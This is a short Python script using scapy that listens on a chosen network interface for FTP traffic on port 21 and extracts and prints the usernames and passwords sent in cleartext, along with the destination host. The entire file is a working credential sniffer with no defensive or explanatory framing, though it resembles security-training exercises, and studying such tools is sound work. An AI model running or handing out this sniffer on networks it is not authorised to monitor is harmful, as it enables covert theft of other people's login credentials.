#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/19/2021

import optparse
from scapy.all import *

def ftpSniff(packet):
    dest = packet.getlayer(IP).dst
    raw = packet.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)' , raw)
    password = re.findall('(?i)PASS (.*)', raw)

    if user:
        print('[!] Detected FTP Login To: ' + str(dest))
        print('[+] User: ' + str(user[0]).strip('\r\n'))
    elif password:
        print('[+] Password: ' + str(password[0]).strip('\r\n'))

def main():
    parser = optparse.OptionParser('Usage: ' +\
            '-i <interface>')
    parser.add_option('-i', dest='interface', \
            type='string', help='Specify Interface to Listen On')
    (options,args) = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(1)
    else:
        conf.iface = options.interface

    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        print('[!] Program Interrupted')
        exit(1)

main()
